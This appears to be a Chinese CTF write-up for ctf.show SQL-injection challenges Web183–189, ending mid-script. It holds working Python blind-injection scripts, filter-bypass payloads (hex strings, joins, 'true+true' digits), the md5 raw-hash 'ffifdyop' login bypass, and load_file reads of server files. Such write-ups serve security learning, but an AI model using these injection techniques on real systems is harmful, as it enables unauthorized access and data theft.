<p>mysql中的正则表达式<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663818919033-8d21fbef-d46b-4425-a373-ebf61b995730.png#averageHue=%23eeedec&clientId=uc376ef83-f99d-4&from=paste&height=594&id=u9e370a63&name=image.png&originHeight=743&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113405&status=done&style=none&taskId=u258a195f-18d7-4d8b-9991-9ecae6d8c52&title=&width=702.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663818926437-dd514105-d918-4891-9cf8-694331d908fa.png#averageHue=%23f5f5f5&clientId=uc376ef83-f99d-4&from=paste&height=441&id=ua32e70ff&name=image.png&originHeight=551&originWidth=733&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53979&status=done&style=none&taskId=u1bd1ac88-68c4-4a51-89c1-590be63c284&title=&width=586.4" alt="image.png"></p>
<h2 id="Web183-无列表回显）"><a href="#Web183-无列表回显）" class="headerlink" title="Web183(无列表回显）"></a>Web183(无列表回显）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663819959480-8bec52c8-89fb-48d7-b0da-9990ace5c953.png#averageHue=%23f7f7f7&clientId=uc376ef83-f99d-4&from=paste&height=597&id=u622a27b4&name=image.png&originHeight=746&originWidth=1440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41538&status=done&style=none&taskId=u56b17f1a-aaec-41fc-8360-6a2a1fdb42b&title=&width=1152" alt="image.png"><br>     可以看到返回值只是所查询表的行数，用了count函数</p>
<ul>
<li>count：返回行数的总数</li>
</ul>
<p>这一题可以用脚本跑正则表达式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:yu22x</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://3bc26e25-61df-4664-9a43-ed74c7255d91.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">s=string.digits+string.ascii_lowercase+<span class="string">&quot;&#123;_-&#125;&quot;</span><span class="comment">#生成数字+小写字母，再加上&#123;,_,-,&#125;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">  <span class="built_in">print</span>(i)</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">    data=&#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>:<span class="string">f&#x27;(ctfshow_user)where(pass)regexp(&quot;^ctfshow<span class="subst">&#123;flag+j&#125;</span>&quot;)&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#print(data)</span></span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;user_count = 1&quot;</span>  <span class="keyword">in</span> r.text):</span><br><span class="line">      flag+=j</span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>用到了正则表达式和括号，括号绕过空格，很好理解<br>string.digits+string.ascii_lowercase的含义：<br>就是srting模块的函数，生成所有数字，生成所有小写字母</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663820063008-d9937b16-ef96-4eff-b02f-4d94464bd9ae.png#averageHue=%23988264&clientId=uc376ef83-f99d-4&from=paste&height=161&id=u613fd392&name=image.png&originHeight=201&originWidth=706&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20165&status=done&style=none&taskId=u4fbe3fa5-7c4d-4239-abc0-35621681223&title=&width=564.8" alt="image.png"></p>
<h2 id="Web184（where，引号过滤）"><a href="#Web184（where，引号过滤）" class="headerlink" title="Web184（where，引号过滤）"></a>Web184（where，引号过滤）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663851482037-70fff098-83ba-4a06-a19a-3f2f1610f6f2.png#averageHue=%23f4f4f4&clientId=ubc7f5ebe-1bf7-4&from=paste&height=326&id=u2d54c6ca&name=image.png&originHeight=407&originWidth=1235&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26754&status=done&style=none&taskId=u31bea170-be6d-4ae0-ba6b-1ee6a66553f&title=&width=988" alt="image.png"><br>查询语句如上，ban掉了挺多的，其中单引号和双引号，where都不能使用了<br>但是注意，这一题把空格放出来了<br>where没了有很多能代替的</p>
<ul>
<li>having：和where类似，具体参考：</li>
</ul>
<p>而且这一题的查询语句也变了，变成了count(*)，他对所有数据进行总和的话就不太好去操作，所以要用到group by 具体怎么用：<br>接下来就是写个脚本了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author Boogipop</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>): <span class="comment">#字符串转16进制字符串0x开头的形式</span></span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        i=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i)) <span class="comment">#hex将十进制变为16进制，ord将字符变为ascii码</span></span><br><span class="line">        i=i.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#把0x前缀去掉，最后再在最前面加上</span></span><br><span class="line">        result=result+i</span><br><span class="line">        result2=<span class="string">&quot;0x&quot;</span>+result<span class="comment">#对应上面</span></span><br><span class="line">    <span class="keyword">return</span> result2</span><br><span class="line">s=string.digits+string.ascii_lowercase+<span class="string">&quot;&#123;_-&#125;&quot;</span><span class="comment">#生成数字+小写字母，再加上&#123;,_,-,&#125;</span></span><br><span class="line">url = <span class="string">&quot;http://b7e07fb1-0c0c-46a7-b14a-608252446a00.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        target=<span class="string">f&quot;ctfshow<span class="subst">&#123;flag+j&#125;</span>&quot;</span></span><br><span class="line">        target=str2hex(target)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user group by pass having pass regexp(<span class="subst">&#123;target&#125;</span>)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">                flag += j</span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由于<code>regexp</code>函数可以识别十六进制字符串，所以我们要把输入的字符串转化为十六进制，再放进去，这样就可以绕过引号了，where就用having去替代<br>答案就出来了</p>
<p>方法好像很多，方法二：</p>
<ul>
<li>Right join,left join,inner join:</li>
</ul>
<p>这三个函数也是可以替代where的，以这三个函数为思路去写个脚本2：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f15ac2ca-94b7-4257-a52a-00e52ecee805.chall.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span>  j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;i&#125;</span>,1)regexp(char(<span class="subst">&#123;j&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Web185（数字过滤）"><a href="#Web185（数字过滤）" class="headerlink" title="Web185（数字过滤）"></a>Web185（数字过滤）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663852689804-167635af-b8a0-4927-977f-4afdbd588f0f.png#averageHue=%23f5f5f5&clientId=ubc7f5ebe-1bf7-4&from=paste&height=306&id=u3f7255ec&name=image.png&originHeight=383&originWidth=1389&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28122&status=done&style=none&taskId=u0fcd3629-ca47-4381-879a-18b60088016&title=&width=1111.2" alt="image.png"><br>在上一题的基础上他娘的过滤了数字<br>无措时看到个图：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663852713483-fbd3f58b-cb72-4ad8-9341-c7e48672f03e.png#averageHue=%23f8f5f3&clientId=ubc7f5ebe-1bf7-4&from=paste&id=u17c7ce88&name=image.png&originHeight=700&originWidth=416&originalType=url&ratio=1&rotation=0&showTitle=false&size=38133&status=done&style=none&taskId=u47eed8f3-0426-4d9a-bdfb-e4f2eb12041&title=" alt="image.png"><br>意思应该挺好懂</p>
<ul>
<li>pi():返回π&#x3D;3.14</li>
<li>floor(X): 该函数返回X的最大整数值，但不能大于X  </li>
<li>ceil(): 该函数返回的最小整数值，但不能小于X。</li>
<li>true&#x3D;1不用说了</li>
</ul>
<p>在此基础上改改上一题的脚本就OK了~<br>改脚本一很难，笔记十六进制字符，改改脚本二</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ff0274dd-9f12-4e8a-b356-55ab4018921e.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;createNum(i)&#125;</span>,<span class="subst">&#123;createNum(<span class="number">1</span>)&#125;</span>)regexp(char(<span class="subst">&#123;createNum(j)&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结束~</p>
<h2 id="Web186（同上）"><a href="#Web186（同上）" class="headerlink" title="Web186（同上）"></a>Web186（同上）</h2><p>用上面的脚本跑</p>
<h2 id="Web187-md5-‘’-true-绕过"><a href="#Web187-md5-‘’-true-绕过" class="headerlink" title="Web187(md5(‘’,true)绕过)"></a>Web187(md5(‘’,true)绕过)</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663907271540-55a7467c-2284-4e6d-89d2-cacd9a3c98dc.png#averageHue=%23f8f8f8&clientId=uec3f9fb7-0c75-4&from=paste&height=514&id=ub6a4fcfa&name=image.png&originHeight=642&originWidth=1475&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38274&status=done&style=none&taskId=uda3c1689-d42d-4433-993e-e6e952a9259&title=&width=1180" alt="image.png"><br>确实是没什么过滤，而且注入点也很容易看到，那就是password，但是password经过了md5(‘’,true)处理过了</p>
<ul>
<li>md5（）：</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663907310056-c9376226-0575-4968-b2b1-5168dee85674.png#averageHue=%23eeeeee&clientId=uec3f9fb7-0c75-4&from=paste&height=444&id=u5a0cfdaa&name=image.png&originHeight=555&originWidth=1052&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49964&status=done&style=none&taskId=u28973ffb-08cd-4ff5-a766-a9c94a7407a&title=&width=841.6" alt="image.png"><br>测试一下就知道了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;HELLO&#x27;</span>,<span class="literal">true</span>)</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663907354963-2ee86cb5-79b6-4055-aa79-2c03569d8857.png#averageHue=%23f2f0ef&clientId=uec3f9fb7-0c75-4&from=paste&height=36&id=u47963b0c&name=image.png&originHeight=45&originWidth=306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2223&status=done&style=none&taskId=ud56ae81d-a2cc-4874-b2f0-a7f0b1f40a6&title=&width=244.8" alt="image.png"><br>输出结果是一堆乱码，所以怎么找到经过这个函数处理后结果为’ or 1这样的字符串，在网上搜到了两个：<br><code>ffifdyop</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663907411252-f275b4c2-2c3e-4dfd-9298-09646bdef3c6.png#averageHue=%23eceae7&clientId=uec3f9fb7-0c75-4&from=paste&height=46&id=u7899227f&name=image.png&originHeight=58&originWidth=241&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2357&status=done&style=none&taskId=uf5ac4f6f-370c-4656-a70b-93958de8f2d&title=&width=192.8" alt="image.png"><br>带有’or’6这样就够了<br><code>129581926211651571912466741651878684928</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663907452220-4cd08626-3ff1-4d37-accb-c18151e66b1f.png#averageHue=%23f3f3cb&clientId=uec3f9fb7-0c75-4&from=paste&height=74&id=u15fd13b9&name=image.png&originHeight=93&originWidth=494&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8097&status=done&style=none&taskId=uff994786-4b6f-4076-8477-cb3ece79752&title=&width=395.2" alt="image.png"><br>带有’or’8也可以满足<br>输入以上任意两个就可以得到flag：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663907488972-1edce0bb-780d-4dd8-aa41-1d08bf045c4b.png#averageHue=%23f6f5f5&clientId=uec3f9fb7-0c75-4&from=paste&height=229&id=ued62bed5&name=image.png&originHeight=286&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55409&status=done&style=none&taskId=u5f7db2a8-add0-442a-abf1-5a422192cff&title=&width=1068" alt="image.png"><br>参考：</p>
<h2 id="Web188（弱类型比较）"><a href="#Web188（弱类型比较）" class="headerlink" title="Web188（弱类型比较）"></a>Web188（弱类型比较）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663908908142-06daeee3-8125-4cb1-95f4-3544da829213.png#averageHue=%23f1f1f1&clientId=u4c1e84cd-1f6a-4&from=paste&height=479&id=uc55dedb7&name=image.png&originHeight=599&originWidth=1170&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45912&status=done&style=none&taskId=u7d15b330-63b0-4d09-bd5a-81df9178907&title=&width=936" alt="image.png"><br>由于用户名和密码肯定字符串，字符串在弱类型比较中就等于0<br>所以payload1：<br>username&#x3D;0,password&#x3D;0<br>或者username&#x3D;1&lt;1,password&#x3D;0</p>
<p>payload2:<br>没有ban掉||<br>username&#x3D;1||1,password&#x3D;0</p>
<h2 id="Web189-load-file-盲注"><a href="#Web189-load-file-盲注" class="headerlink" title="Web189(load_file+盲注)"></a>Web189(load_file+盲注)</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663915179652-d4b16103-5c71-49a4-943d-15253b10366c.png#averageHue=%23f3f3f3&clientId=udddb62e8-82cd-4&from=paste&height=490&id=ua8db3c77&name=image.png&originHeight=612&originWidth=1289&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43991&status=done&style=none&taskId=u00ce8e22-1230-4f01-8df0-02e5b7af608&title=&width=1031.2" alt="image.png"><br>前置知识：</p>
<ul>
<li><code>load_file():</code>	mysql函数，和php的file_get_contents作用一样，得到文件的内容，返回字符串</li>
<li><code>locate()</code>：MySQL中的LOCATE()函数<strong>用于查找字符串中子字符串的位置</strong>。 它将返回字符串中子字符串首次出现的位置。 如果字符串中不存在子字符串，则它将返回0。 在字符串中搜索子字符串的位置时，它不会执行区分大小写的搜索</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663915333234-c5b54089-6848-4f8c-af46-70ee08fd48f4.png#averageHue=%23f6f6f5&clientId=udddb62e8-82cd-4&from=paste&height=98&id=ub50a2a3e&name=image.png&originHeight=123&originWidth=1492&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17451&status=done&style=none&taskId=u129b6fba-37c3-4fef-8eb9-2a2415c9836&title=&width=1193.6" alt="image.png"><br>这样就好说了，这一题用上一题的payload会发现可以得到提示，密码错误，说明username是没有错的，用0就可以绕过，密码换了，无法用0去绕过了</p>
<p>这样子就只可以用BOOLEAN盲注，写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author：Y4tacker</span></span><br><span class="line"><span class="comment"># Changer:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2d6f9116-1123-45ed-bcd5-d81dd594951e.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlagIndex</span>():<span class="comment">#用于获取flag的位置</span></span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">300</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment">#二分法找位置</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;ctfshow&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;0&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(mid),<span class="comment">#找到flag中</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">return</span> mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">num</span>):<span class="comment">#得到flag</span></span><br><span class="line">    i = <span class="built_in">int</span>(num)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment">#二分法找位置</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(i,mid),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">            mid += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = getFlagIndex()</span><br><span class="line">getFlag(index)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用load_file和locate首先定位flag出现在哪儿，再去盲注读取<br>还可以改一下脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author：Y4tacker</span></span><br><span class="line"><span class="comment"># Changer:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2d6f9116-1123-45ed-bcd5-d81dd594951e.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">num</span>):<span class="comment">#得到flag</span></span><br><span class="line">    i = <span class="built_in">int</span>(num)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        head = <span class="number">1</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment">#二分法找位置</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(i,mid),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">            mid += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">1</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">getFlag(<span 